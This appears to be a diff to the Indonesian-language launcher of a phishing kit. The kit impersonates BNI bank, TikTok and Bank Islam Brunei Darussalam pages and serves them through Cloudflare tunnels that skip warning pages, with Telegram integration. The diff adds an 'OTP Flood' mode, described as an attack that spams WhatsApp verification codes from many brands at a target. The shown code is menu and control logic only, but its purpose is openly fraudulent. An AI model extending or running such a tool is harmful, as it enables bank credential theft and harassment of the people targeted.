@@ -1,14 +1,15 @@
 #!/usr/bin/env python3
 """
 METACYTECH - Interactive Launcher v3.0
-Dual Template System: BNI (Bank Transfer) + TikTok (Video Share Link)
-Cloudflare Tunnel (no warning page) + Next.js + Telegram
+Multi Template: BNI + TikTok + BIBD + OTP Flood
+Cloudflare Tunnel (no warning page) + Next.js + Telegram + OTP Testing
 """
 
 import os
 import sys
 import time
 import json
+import importlib.util
 import re
 import shutil
 import subprocess
@@ -128,6 +129,14 @@ TEMPLATES = {
         "dir": os.path.join(TEMPLATES_DIR, "bibd"),
         "public_dir": os.path.join(TEMPLATES_DIR, "bibd", "public"),
     },
+    "otp_flood": {
+        "name": "OTP Flood - Banjir Kode Verifikasi",
+        "icon": "[4]",
+        "label": "Spam OTP Multi-Brand",
+        "title": "OTP Flood Testing",
+        "description": "Banjir kode OTP WhatsApp ratusan brand",
+        "is_otp_mode": True,
+    },
 }
 
 
@@ -245,21 +254,30 @@ def template_menu(current_template):
 
 def menu(current_template):
     tmpl = TEMPLATES[current_template]
+    is_otp = tmpl.get("is_otp_mode", False)
     print(f"{C.B}{C.WHT}  +-------------------------------------------------+{C.RST}")
     print(f"{C.B}{C.WHT}  |              MAIN MENU                          |{C.RST}")
     print(f"{C.B}{C.WHT}  +-------------------------------------------------+{C.RST}")
-    print(f"{C.B}{C.WHT}  |  [1] Start Everything                          |{C.RST}")
-    print(f"{C.DIM}  |       Build + Server + Cloudflare Tunnel       |{C.RST}")
-    print(f"{C.B}{C.WHT}  |  [2] Stop Everything                           |{C.RST}")
-    print(f"{C.DIM}  |       Kill all services                        |{C.RST}")
-    print(f"{C.B}{C.WHT}  |  [3] Show Status                               |{C.RST}")
-    print(f"{C.DIM}  |       Check running services & URL             |{C.RST}")
-    print(f"{C.B}{C.WHT}  |  [4] Copy URL                                  |{C.RST}")
-    print(f"{C.DIM}  |       Copy tunnel URL to clipboard             |{C.RST}")
-    print(f"{C.B}{C.WHT}  |  [5] Ganti Template                            |{C.RST}")
-    print(f"{C.DIM}  |       Current: {tmpl['name']:<29}{C.RST}|{C.RST}")
-    print(f"{C.B}{C.WHT}  |  [6] Exit                                      |{C.RST}")
-    print(f"{C.DIM}  |       Stop all and quit                        |{C.RST}")
+    if is_otp:
+        print(f"{C.B}{C.WHT}  |  [1] Mulai OTP Flood                           |{C.RST}")
+        print(f"{C.DIM}  |       Jalankan serangan OTP ke target        |{C.RST}")
+        print(f"{C.B}{C.WHT}  |  [2] Ganti Template                            |{C.RST}")
+        print(f"{C.DIM}  |       Kembali pilih template lain            |{C.RST}")
+        print(f"{C.B}{C.WHT}  |  [3] Exit                                      |{C.RST}")
+        print(f"{C.DIM}  |       Keluar dari aplikasi                   |{C.RST}")
+    else:
+        print(f"{C.B}{C.WHT}  |  [1] Start Everything                          |{C.RST}")
+        print(f"{C.DIM}  |       Build + Server + Cloudflare Tunnel       |{C.RST}")
+        print(f"{C.B}{C.WHT}  |  [2] Stop Everything                           |{C.RST}")
+        print(f"{C.DIM}  |       Kill all services                        |{C.RST}")
+        print(f"{C.B}{C.WHT}  |  [3] Show Status                               |{C.RST}")
+        print(f"{C.DIM}  |       Check running services & URL             |{C.RST}")
+        print(f"{C.B}{C.WHT}  |  [4] Copy URL                                  |{C.RST}")
+        print(f"{C.DIM}  |       Copy tunnel URL to clipboard             |{C.RST}")
+        print(f"{C.B}{C.WHT}  |  [5] Ganti Template                            |{C.RST}")
+        print(f"{C.DIM}  |       Current: {tmpl['name']:<29}{C.RST}|{C.RST}")
+        print(f"{C.B}{C.WHT}  |  [6] Exit                                      |{C.RST}")
+        print(f"{C.DIM}  |       Stop all and quit                        |{C.RST}")
     print(f"{C.B}{C.WHT}  +-------------------------------------------------+{C.RST}")
     print()
 
@@ -660,6 +678,21 @@ def choose_template(eng):
         print(f"{C.YLW}  Pilihan tidak valid!{C.RST}")
 
 
+def _run_otp_flood():
+    """Run OTP Flood interactive session."""
+    try:
+        from modules.otp_flood.ui import otp_flood_menu
+        otp_flood_menu()
+        return True
+    except ImportError as e:
+        print(f"{C.RED}  OTP Flood module tidak ditemukan: {e}{C.RST}")
+        print(f"{C.YLW}  Pastikan folder modules/otp_flood/ ada.{C.RST}")
+        return False
+    except Exception as e:
+        print(f"{C.RED}  OTP Flood error: {e}{C.RST}")
+        return False
+
+
 def main():
     if os.name == "nt": os.system("")
     eng = Engine()
@@ -674,6 +707,8 @@ def main():
     print(f"{C.DIM}  |       Template verifikasi video TikTok         |{C.RST}")
     print(f"{C.B}{C.WHT}  |  [3] BIBD - Bank Islam Brunei Darussalam        |{C.RST}")
     print(f"{C.DIM}  |       Upload file + info akun BIBD             |{C.RST}")
+    print(f"{C.B}{C.WHT}  |  [4] OTP Flood - Banjir Kode Verifikasi         |{C.RST}")
+    print(f"{C.DIM}  |       Spam OTP WhatsApp multi-brand           |{C.RST}")
     print(f"{C.B}{C.WHT}  +-------------------------------------------------+{C.RST}")
     print()
 
@@ -690,43 +725,71 @@ def main():
                 time.sleep(0.5)
                 break
             else:
-                print(f"{C.YLW}  Masukkan 1 atau 2!{C.RST}")
+                print(f"{C.YLW}  Masukkan 1-{len(tmpl_keys)}!{C.RST}")
         except (KeyboardInterrupt, EOFError):
             print(f"\n{C.CYN}Sampai jumpa!{C.RST}")
             sys.exit(0)
 
-    eng.start_all()
+    # If OTP Flood mode, run directly (no build/server needed)
+    if TEMPLATES[eng.current_template].get("is_otp_mode"):
+        _run_otp_flood()
+        # After flood menu returns, go back to template selection
+        main_loop(eng)
+        return
 
+    eng.start_all()
+    main_loop(eng)
+
+
+def main_loop(eng):
+    """Main interactive loop after template selected."""
     while True:
         try:
             print(f"{C.B}{C.WHT}  {'=' * 50}{C.RST}\n")
             menu(eng.current_template)
-            print(f"{C.CYN}  Pilih menu (1-6): {C.RST}", end="")
+            is_otp = TEMPLATES[eng.current_template].get("is_otp_mode", False)
+            if is_otp:
+                print(f"{C.CYN}  Pilih menu (1-3): {C.RST}", end="")
+            else:
+                print(f"{C.CYN}  Pilih menu (1-6): {C.RST}", end="")
             ch = input().strip()
-            if ch == "1": eng.start_all()
-            elif ch == "2": eng.stop_all()
-            elif ch == "3": eng.show_status()
-            elif ch == "4":
-                url = eng.url
-                if not url:
-                    eng.show_status()
-                    url = eng.url
-                if url:
-                    print(f"\n  {C.B}{C.CYN}URL:{C.RST}")
-                    print(f"  {C.BG_B}{C.WHT}  {url}  {C.RST}\n")
-                    try:
-                        subprocess.run("clip", input=url.encode("utf-8"), check=True)
-                        print(f"  {C.GRN}Disalin ke clipboard!{C.RST}\n")
-                    except: print(f"  {C.DIM}(Salin manual){C.RST}\n")
+
+            if is_otp:
+                if ch == "1":
+                    _run_otp_flood()
+                elif ch == "2":
+                    main()
+                    return
+                elif ch == "3":
+                    print(f"  {C.CYN}Sampai jumpa!{C.RST}\n")
+                    sys.exit(0)
                 else:
-                    print(f"\n  {C.YLW}Tidak ada URL. Tekan [1] untuk memulai.{C.RST}\n")
-            elif ch == "5":
-                choose_template(eng)
-            elif ch == "6":
-                eng.stop_all()
-                print(f"  {C.CYN}Sampai jumpa!{C.RST}\n")
-                sys.exit(0)
-            else: print(f"  {C.YLW}Masukkan 1-6{C.RST}")
+                    print(f"  {C.YLW}Masukkan 1-3{C.RST}")
+            else:
+                if ch == "1": eng.start_all()
+                elif ch == "2": eng.stop_all()
+                elif ch == "3": eng.show_status()
+                elif ch == "4":
+                    url = eng.url
+                    if not url:
+                        eng.show_status()
+                        url = eng.url
+                    if url:
+                        print(f"\n  {C.B}{C.CYN}URL:{C.RST}")
+                        print(f"  {C.BG_B}{C.WHT}  {url}  {C.RST}\n")
+                        try:
+                            subprocess.run("clip", input=url.encode("utf-8"), check=True)
+                            print(f"  {C.GRN}Disalin ke clipboard!{C.RST}\n")
+                        except: print(f"  {C.DIM}(Salin manual){C.RST}\n")
+                    else:
+                        print(f"\n  {C.YLW}Tidak ada URL. Tekan [1] untuk memulai.{C.RST}\n")
+                elif ch == "5":
+                    choose_template(eng)
+                elif ch == "6":
+                    eng.stop_all()
+                    print(f"  {C.CYN}Sampai jumpa!{C.RST}\n")
+                    sys.exit(0)
+                else: print(f"  {C.YLW}Masukkan 1-6{C.RST}")
         except KeyboardInterrupt:
             print(); eng.stop_all()
             print(f"  {C.CYN}Sampai jumpa!{C.RST}\n"); sys.exit(0)
